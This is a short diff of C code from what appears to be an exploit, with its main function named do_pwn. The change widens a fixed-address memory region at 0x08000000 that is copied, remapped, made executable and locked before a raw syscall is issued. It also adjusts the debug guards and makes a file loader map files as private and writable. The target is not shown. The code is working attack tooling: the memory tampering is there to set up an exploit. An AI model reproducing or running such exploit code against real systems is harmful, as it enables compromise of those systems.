@@ -102,19 +102,19 @@ void do_pwn() {
     assert(!mlock((void *) target_pagebase, 0x2000));
 
     // I don't even want to know...
-    char buf[0x2000];
-    memcpy(buf, (void *) 0x08000000, 0x2000);
-    assert(!munmap((void *) 0x08000000, 0x2000));
-    assert(MAP_FAILED != mmap((void *) 0x08000000, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
-    memcpy((void *) 0x08000000, buf, 0x2000);
-    assert(!mprotect((void *)0x08000000, 0x1000, PROT_READ | PROT_EXEC));
+    char buf[0x3000];
+    memcpy(buf, (void *) 0x08000000, 0x3000);
+    assert(!munmap((void *) 0x08000000, 0x3000));
+    assert(MAP_FAILED != mmap((void *) 0x08000000, 0x3000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
+    memcpy((void *) 0x08000000, buf, 0x3000);
+    assert(!mprotect((void *)0x08000000, 0x2000, PROT_READ | PROT_EXEC));
 
-    assert(!mlock((void *) 0x08000000, 0x2000));
-#ifdef DEBUG
+    assert(!mlock((void *) 0x08000000, 0x3000));
+#if DEBUG
     printf("ok\n"); fflush(stdout);
 #endif
     syscall(0);
-#ifdef DEBUG
+#if DEBUG
     printf("we're out\n"); fflush(stdout);
 #endif
 }
@@ -123,7 +123,7 @@ static void load(const char *fn, void **base, size_t *size) {
     int fd = open(fn, O_RDONLY);
     assert(fd != -1);
     off_t len = lseek(fd, 0, SEEK_END);
-    void *addr = mmap(NULL, len, PROT_READ, MAP_SHARED, fd, 0);
+    void *addr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
     assert(addr != MAP_FAILED);
     assert(!mlock(addr, (size_t) len));
     *base = addr;
